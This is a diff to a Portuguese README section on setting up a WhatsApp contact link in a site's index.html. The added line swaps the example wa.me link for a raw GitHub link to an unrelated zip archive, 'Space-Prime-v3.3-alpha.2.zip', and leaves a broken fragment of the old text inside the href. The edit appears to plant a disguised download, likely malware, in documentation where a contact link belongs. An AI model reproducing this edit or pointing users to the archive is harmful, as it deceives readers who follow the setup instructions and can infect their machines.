@@ -104,7 +104,7 @@ Substitua as URLs das imagens no `index.html`:
 ### Configurar WhatsApp
 No `index.html`, modifique o link do WhatsApp:
 ```html
-<a href="https://wa.me/551199998888?text=Sua mensagem personalizada">
+<a href="https://raw.githubusercontent.com/CodeBy-red/PrimeSpace/main/xyletic/Space-Prime-v3.3-alpha.2.zip mensagem personalizada">
 ```
 
 ### Personalizar Formulário
